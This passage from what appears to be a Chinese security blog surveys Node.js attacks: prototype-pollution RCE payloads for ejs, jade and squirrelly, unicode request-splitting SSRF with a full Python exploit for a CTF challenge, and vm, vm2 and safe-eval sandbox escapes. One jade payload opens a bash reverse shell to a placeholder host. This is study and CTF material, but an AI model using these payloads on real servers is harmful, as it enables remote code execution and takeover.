+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;
+</code></pre>
+<p><strong>例二</strong></p>
+<pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var user = new function()&#123;
+    this.userinfo = new function()&#123;
+    this.isVIP = false;
+    this.isAdmin = false;    
+    &#125;;
+  &#125;;
+  utils.copy(user.userinfo,req.body);
+  if(user.userinfo.isAdmin)&#123;
+    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);  
+  &#125;else&#123;
+    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);  
+  &#125;
+
+&#125;);
+</code></pre>
+<p>**<em>payload1</em>**：覆盖 opts.outputFunctionName , 这样构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。  </p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;
+
+&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;
+</code></pre>
+<p>**<em>payload2</em>**：伪造 opts.escapeFunction 也可以进行 RCE  </p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;
+</code></pre>
+<p><strong>补充:</strong> 在 ejs 模板中还有三个可控的参数, 分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链。  </p>
+<h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebug的伪造<br>给出上面题目的payload，可参考着看。</p>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;
+</code></pre>
+<pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;
+</code></pre>
+<h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p>
+<pre><code class="javascript">const express = require(&#39;express&#39;)
+const squirrelly = require(&#39;squirrelly&#39;)
+const app = express()
+
+app.set(&#39;views&#39;, __dirname);
+app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)
+app.use(express.urlencoded(&#123; extended: false &#125;));
+app.get(&#39;/&#39;, (req, res) =&gt; &#123;
+   res.render(&#39;index.squirrelly&#39;, req.query)
+&#125;)
+
+var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;
+
+    var host = server.address().address
+    var port = server.address().port
+
+    console.log(&quot;Listening on http://%s:%s&quot;, host, port)
+&#125;);
+</code></pre>
+<p> index.squirrelly  </p>
+<pre><code class="javascript">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;CVE-2021-32819&lt;/title&gt;
+        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;
+    &lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p> payload  </p>
+<pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //
+</code></pre>
+<p>PS:以下贴出几篇文章，师傅们可以跟进分析：<br><a target="_blank" rel="noopener" href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p>
+<h1 id="nodejs中的ssrf"><a href="#nodejs中的ssrf" class="headerlink" title="nodejs中的ssrf"></a>nodejs中的ssrf</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>**虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节  **</p>
+<pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;
+&#39;/café🐶&#39;
+&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)
+&#39;/café=6&#39;
+</code></pre>
+<p><strong>Crlf HTTP头注入:</strong><br> 假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：  </p>
+<pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1
+Authorization: server-secret-key
+</code></pre>
+<p> 如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：  </p>
+<pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;
+</code></pre>
+<p> 在发出请求时，服务器可能会直接将其写入路径，如下：  </p>
+<pre><code class="plsql">GET /private-api?q=x HTTP/1.1
+
+DELETE /private-api
+Authorization: server-secret-key
+</code></pre>
+<p><strong>说到底就是\r\n成功生效</strong><br>接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE<br>好的HTTP库通通常包含阻止这一行为的措施，Node.js也不例外：如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码：</p>
+<pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output
+[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]
+</code></pre>
+<p> 不幸的是，上述的处理unicode字符错误意味着可以规避这些措施。考虑如下的URL，其中包含一些带变音符号的unicode字符：  </p>
+<pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;
+http://example.com/čĊ/test
+</code></pre>
+<p> 当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符：  </p>
+<pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output
+[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]
+</code></pre>
+<p> 但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\r”和“\n”：  </p>
+<pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()
+&#39;http://example.com/\r\n/test&#39;
+</code></pre>
+<p>Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符<br>说白了，上面这段的意思就是我们可以利用一些特殊字符，它们在URL请求时不会被转义处理，但是当它到了js引擎时，由于其默认用的是latin1，因此可以将我们用的特殊字符转义得到我们需要的字符，从而达到ssrf的目的</p>
+<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>source：</strong></p>
+<pre><code class="plsql">var express = require(&#39;express&#39;); 
+var app = express(); 
+var fs = require(&#39;fs&#39;); 
+var path = require(&#39;path&#39;); // 处理文件路径 
+var http = require(&#39;http&#39;); 
+var pug = require(`pug`); // 模板渲染 
+var morgan = require(&#39;morgan&#39;); // 日志 
+const multer = require(&#39;multer&#39;); // 用于处理multipart/form-data类型的表单数据，实现上传功能
+
+// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组 
+app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;)); 
+// 使用简化版日志 
+app.use(morgan(&#39;short&#39;));  
+
+// 静态文件路由 
+app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#39;/uploads&#39;))) 
+app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#39;/template&#39;)))  
+app.get(&#39;/&#39;, function (req, res) &#123;    
+  // GET方法获取action参数    
+  var action = req.query.action ? req.query.action : &quot;index&quot;;    
+  // action中不能包含/ &amp; \    
+  if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;        
+    res.send(&quot;Errrrr, You have been Blocked&quot;);    
+  &#125;    
+  
+  // 将/template/[action].pug渲染成html输出到根目录    
+  file = path.join(__dirname + &#39;/template/&#39; + action + &#39;.pug&#39;);    
+  var html = pug.renderFile(file);    
+  res.send(html); 
+&#125;);  
+
+app.post(&#39;/file_upload&#39;, function (req, res) &#123;    
+  var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    
+  var obj = &#123;msg: &#39;&#39;,&#125;    
+  // 请求必须来自localhost    
+  if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;        
+    obj.msg = &quot;only admin&#39;s ip can use it&quot;        
+    res.send(JSON.stringify(obj));        
+    return    
+  &#125;    
+  fs.readFile(req.files[0].path, function (err, data) &#123;        
+    if (err) &#123;            
+      obj.msg = &#39;upload failed&#39;;            
+      res.send(JSON.stringify(obj));        
+    &#125; else &#123;            
+      // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            
+      var file_path = &#39;/uploads/&#39; + req.files[0].mimetype + &quot;/&quot;;            
+      var file_name = req.files[0].originalname            
+      var dir_file = __dirname + file_path + file_name            
+      if (!fs.existsSync(__dirname + file_path)) &#123;                
+        try &#123;                    
+          fs.mkdirSync(__dirname + file_path)                
+        &#125; catch (error) &#123;                    
+          obj.msg = &quot;file type error&quot;;                    
+          res.send(JSON.stringify(obj));                    
+          return                
+        &#125;            
+      &#125;            
+      try &#123;                
+        fs.writeFileSync(dir_file, data)                
+        obj = &#123;msg: &#39;upload success&#39;, filename: file_path + file_name&#125;            
+      &#125; catch (error) &#123;                
+        obj.msg = &#39;upload failed&#39;;            
+      &#125;            
+      res.send(JSON.stringify(obj));        
+    &#125;    
+  &#125;) 
+&#125;)  
+
+// 查看题目源码 
+app.get(&#39;/source&#39;, function (req, res) &#123;    
+  res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;)); &#125;);  
+app.get(&#39;/core&#39;, function (req, res) &#123;    
+  var q = req.query.q;    
+  var resp = &quot;&quot;;    
+  if (q) &#123;        
+    var url = &#39;http://localhost:8081/source?&#39; + q        
+    console.log(url)        
+   
+    // 对url字符进行waf        
+    var trigger = blacklist(url);        
+    if (trigger === true) &#123;            
+      res.send(&quot;error occurs!&quot;);        
+    &#125; else &#123;            
+      try &#123;                
+      
+        // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                
+        http.get(url, function (resp) &#123;                    
+          resp.setEncoding(&#39;utf8&#39;);                    
+          resp.on(&#39;error&#39;, function (err) &#123;                        
+            if (err.code === &quot;ECONNRESET&quot;) &#123;                            
+              console.log(&quot;Timeout occurs&quot;);                        
+            &#125;                    
+          &#125;);                    
+          
+          // 返回结果输出到/core                    
+          resp.on(&#39;data&#39;, function (chunk) &#123;                        
+            try &#123;                            
+              resps = chunk.toString();                            
+              res.send(resps);                        
+            &#125; catch (e) &#123;                            
+              res.send(e.message);                        
+            &#125;                    
+          &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                        
+            res.send(e.message);                    
+          &#125;);                
+        &#125;);            
+      &#125; catch (error) &#123;                
+        console.log(error);            
+      &#125;        
+    &#125;    
+  &#125; else &#123;        
+    res.send(&quot;search param &#39;q&#39; missing!&quot;);    
+  &#125; 
+&#125;)  
+// 关键字waf 利用字符串拼接实现绕过 
+function blacklist(url) &#123;    
+  var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];    
+  var arrayLen = evilwords.length;     
+  for (var i = 0; i &lt; arrayLen; i++) &#123;        
+    const trigger = url.includes(evilwords[i]);        
+    if (trigger === true) &#123;            
+      return true        
+    &#125;    
+  &#125; 
+&#125;  
+var server = app.listen(8081, function () &#123;    
+  var host = server.address().address    
+  var port = server.address().port    
+  console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) 
+&#125;)
+</code></pre>
+<p><strong>exp:</strong></p>
+<pre><code class="plsql">import requests
+
+payload = &quot;&quot;&quot; HTTP/1.1
+Host: 127.0.0.1
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Host: 127.0.0.1
+Content-Length: &#123;&#125;
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt
+
+&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)
+
+body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;
+Content-Type: ../template
+
+-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)
+-return x
+------WebKitFormBoundarysAs7bV3fMHq0JXUt--
+
+&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)
+
+payload = payload.format(len(body), body) \
+    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \
+    .replace(&#39; &#39;, &#39;\u0120&#39;)             \
+    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \
+    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \
+    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \
+    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \
+    .replace(&#39;]&#39;, &#39;\u015d&#39;) \
+    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;
+
+session = requests.Session()
+session.trust_env = False
+response1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)
+response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)
+print(response.text)
+</code></pre>
+<h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><strong>context</strong><br> vm 模块创建一个V8虚拟引擎 context（上下文、环境）来编译和运行代码。  </p>
+<pre><code class="plsql">context 是语境、环境、上下文的意思，类似于文章的语境，一句话的意思需要根据语境推断，即文章的上下文。以此类比，这里的 context 是 JavaScript 代码所处的环境（有点像作用域的概念），一条代码语句在不同的环境执行的结果也不同。
+</code></pre>
+<p>调用代码与被调用代码处于不同的 context，意味着它们的 global 对象是不同的。<br>例子：</p>
+<pre><code class="plsql">const vm = require(&#39;vm&#39;);
+
+// global下定义一个 x 变量
+const x = 1;
+
+// context也定义一个 x 变量
+const context = &#123; x: 2 &#125;;
+vm.createContext(context);          // 语境化 &#123;x:2&#125;
+
+// code包含的代码将在 context 下执行，所以其中所有代码访问的变量都是 context 下的
+const code = &#39;x += 40; var y = 17;&#39;;
+vm.runInContext(code, context);
+
+// context = &#123;x:42, y:17&#125;
+console.log(context.x); // 42
+console.log(context.y); // 17
+
+// global没有被改动
+console.log(x); // 1; y is not defined.
+</code></pre>
+<p> code执行的环境是 context ，它访问的全局对象就是访问自定义的 context 对象。<br><strong>contextify 语境化</strong><br> 根据 V8 引擎的文档指明：  </p>
+<pre><code class="plsql">在 V8 中，context 是一个执行环境，它允许在隔离的、无关联的一个 V8 实例中运行 JavaScript 应用。你必须为运行的任何JavaScript代码指定所应该处于的 context。
+</code></pre>
+<p>vm.createContext() 有一个 contextobject 参数，用于接收一个对象（如果没有，就在模块内部创建一个），所谓语境化就是创建一个 context（对象） 然后传入 contextObject 作为代码执行环境的过程。  </p>
+<h2 id="vm逃逸"><a href="#vm逃逸" class="headerlink" title="vm逃逸"></a>vm逃逸</h2><p>vm创建一个新的 context 执行 JavaScript 代码，不能访问 global 对象，看起来就像一个沙箱了。<br>例如我们想要访问 process：</p>
+<pre><code class="plsql">&quot;use strict&quot;;
+const vm = require(&quot;vm&quot;);
+const xyz = vm.runInNewContext(`process`);   // 默认 context = &#123;&#125;
+console.log(xyz);
+</code></pre>
+<p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> 预料之中，因为 process 不存在于新的 context，它存在于原来的 context 中，而原来的 context 的 global 对象有 process 属性：  </p>
+<pre><code class="plsql">&quot;use strict&quot;;
+console.log(process)
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> 通过对象带有的 constructor 属性逃逸:</p>
+<pre><code class="plsql">&quot;use strict&quot;;
+const vm = require(&quot;vm&quot;);
+const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);
+console.log(xyz);  // xyz的值为最后一句JavaScript代码执行的结果，这里是函数返回值
+</code></pre>
+<p>结果:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>this引用的是当前所在的一个对象，这里是传入 contextObject 的对象，它在外部定义，所以它属于外部的 context。通过 .constructor 得到 Object Contrustor ，再通过 .constructor 得到 Function constructor，这是函数的构造函数，通过传入一个包含代码的字符串参数就能创建一个新的函数，最后的 () 就是调用这个函数。<br>获得 process 之后就能 RCE 了。</p>
+<pre><code class="plsql">&quot;use strict&quot;;
+const vm = require(&quot;vm&quot;);
+const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();
+process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);
+console.log(xyz);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p>
+<h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js 内置的 vm 模块提供的沙箱环境的隔离程度不高，因此最好不要执行不受信任的代码，这一点在node.js文档中明确指出。<br>vm2是一个第三方模块，基于vm模块、Proxy特性、require重写来实现，能提供隔离程度更高的沙箱。<br> vm的例子在vm2运行：  </p>
+<pre><code class="plsql">&quot;use strict&quot;;
+const &#123;VM&#125; = require(&#39;vm2&#39;);
+new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> 这次通过 this.constructor.constructor 也不能获取 process 了。这是由于 vm2 语境化了在 vm context 中的所有对象，.constructor指向的构造函数并不是外部的 context 。  </p>
+<pre><code class="plsql">// vm
+&quot;use strict&quot;;
+const vm = require(&quot;vm&quot;);
+const xyz = vm.runInNewContext(`this.constructor.constructor`);
+console.log(xyz)                       // Function: Function
+console.log(xyz === &#123;&#125;.constructor.constructor);       // true
+
+// vm2
+&quot;use strict&quot;;
+const &#123;VM&#125; = require(&#39;vm2&#39;);
+const xyz = new VM().run(&#39;this.constructor.constructor&#39;);
+console.log(xyz)                       // Function: Function
+console.log(xyz === &#123;&#125;.constructor.constructor)        // false
+</code></pre>
+<p><strong>vm2逃逸思路</strong><br>逃逸的思路：我们需要一些沙箱外的东西，它不在沙箱 context 的限制范围内，通过它就能再次访问 constructor 。<br>**1.异常处理机制 try catch 就能做到这一点，主进程在 try 抛出异常，然后在 catch 捕获 error 对象，通过这个 error 对象引用到 process **</p>
+<pre><code>vm2 将该漏洞已修复
+</code></pre>
+<pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); 
+nvm = new NodeVM()
+
+nvm.run(`
+    try &#123;
+        this.process.removeListener(); 
+    &#125; 
+    catch (host_exception) &#123;
+        console.log(&#39;host exception: &#39; + host_exception.toString());
+        // 通过 error 对象引用
+        host_constructor = host_exception.constructor.constructor;
+        host_process = host_constructor(&#39;return this&#39;)().process;
+    child_process = host_process.mainModule.require(&quot;child_process&quot;);
+    console.log(child_process.execSync(&quot;whoami&quot;).toString());
+    &#125;`);
+</code></pre>
+<p> 结果：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>其他得一些payload</p>
+<pre><code class="plsql">var handler = &#123;
+    get () &#123;
+     console.log(&quot;get&quot;);
+    &#125;
+  &#125;;
+var target = &#123;&#125;;
+var proxy = new Proxy(target, handler);
+
+Object.prototype.has = function(t, k)&#123;
+    console.log(&quot;has&quot;);
+&#125;
+
+proxy.a; //触发get
+&quot;&quot; in proxy; //触发has，这个has是在原型链上定义的w
+</code></pre>
+<p>========================================</p>
+<pre><code class="plsql">&quot;use strict&quot;;
+
+var process;
+
+Object.prototype.has = function (t, k) &#123;
+    process = t.constructor(&quot;return process&quot;)();
+&#125;;
+
+&quot;&quot; in Buffer.from;
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
+</code></pre>
+<h2 id="safe-eval模块逃逸"><a href="#safe-eval模块逃逸" class="headerlink" title="safe-eval模块逃逸"></a>safe-eval模块逃逸</h2><p> safe-eval 第三方模块基于内置模块 vm 实现，可以用于执行 JavaScript 代码，默认能访问 V8 引擎的 JavaScript APIs，而不能访问 node.js 的 APIs，但通过传入 context 也能实现对它们的访问。  </p>
+<pre><code class="plsql">safeEval(code, [context], [options])
+</code></pre>
+<p> context 是一个包含属性和方法的对象，这些方法和属性从全局，所以要注意传入的属性和方法，否则会造成沙箱逃逸。<br> 在 version &lt;= 0.3.0 中，safe-eval 存在沙箱逃逸的漏洞：  </p>
+<pre><code class="plsql">&gt;npm i safe-eval@0.3.0
+</code></pre>
+<pre><code class="plsql">// test.js
+const safeEval = require(&#39;safe-eval&#39;)
+var code = `
+    this.constructor.constructor(&#39;return process&#39;)()
+`
+var evaluated = safeEval(code)
+console.log(evaluated)            // process [....]
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 的修补方法是将对象的 constructor 重新定义为 undefined，包括在 context 传入的对象：  </p>
+<pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)
+
+var code = &#39;this.constructor&#39;
+var evaluated = safeEval(code)      
+console.log(evaluated)             // undefined
+
+var code = &#39;a&#39;
+var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)
+console.log(evaluated2)           // &#123;constructor: undefined&#125;
+</code></pre>
+<p><strong>safe-eval  1.3.6  版本逃逸</strong></p>
+<pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);
+
+const theFunction = function () &#123;
+  const process = clearImmediate.constructor(&quot;return process;&quot;)();
+  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
+&#125;;
+const untrusted = `($&#123;theFunction&#125;)()`;
+
+console.log(saferEval(untrusted));
+</code></pre>
+<p>payload:</p>
+<pre><code class="plsql">(function () &#123;
+
+const process = clearImmediate.constructor(&quot;return process;&quot;)();
+
+return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()
+</code></pre>
+<h2 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h2><h3 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h3><p>链接:<a target="_blank" rel="noopener" href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>这里使用docker搭建<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p>
+<p>我们查看下源代码:</p>
+<pre><code class="plsql">const express = require(&#39;express&#39;);
+const bodyParser = require(&#39;body-parser&#39;);
+
+const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 找到一个很棒的库
+
+const fs = require(&#39;fs&#39;);
+
+const app = express();
+
+
+app.use(bodyParser.urlencoded(&#123; extended: false &#125;));
+app.use(bodyParser.json());
+
+// 2020.1/WORKER2 老板说为了后期方便优化
+app.use((req, res, next) =&gt; &#123;
+  if (req.path === &#39;/eval&#39;) &#123;
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) &#123;
+      delay = Math.max(delay, parseInt(req.query.delay));
+    &#125;
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; &#123;
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try &#123;
+        res.send(&#39;Timeout!&#39;);
+      &#125; catch (e) &#123;
+
+      &#125;
+    &#125;, 1000);
+  &#125; else &#123;
+    next();
+  &#125;
+&#125;);
+
+app.post(&#39;/eval&#39;, function (req, res) &#123;
+  let response = &#39;&#39;;
+  if (req.body.e) &#123;
+    try &#123;
+      response = saferEval(req.body.e);
+    &#125; catch (e) &#123;
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    &#125;
+  &#125;
+  res.send(String(response));
+&#125;);
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get(&#39;/source&#39;, function (req, res) &#123;
+  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.js&#39;));
+&#125;);
+
+// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
+app.get(&#39;/version&#39;, function (req, res) &#123;
+  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./package.json&#39;));
+&#125;);
+
+app.get(&#39;/&#39;, function (req, res) &#123;
+  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);
+  res.send(fs.readFileSync(&#39;./index.html&#39;))
+&#125;)
+
+app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;
+  console.log(&#39;Start listening&#39;)
+&#125;);
+</code></pre>
+<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>在这段代码中存在safe-eval，我们查看下它得版本<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6是存在漏洞的<br>我们先继续分析代码:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> 通过/eval?delay=上传一个数字并和60000比较，大的赋值给delay  </p>
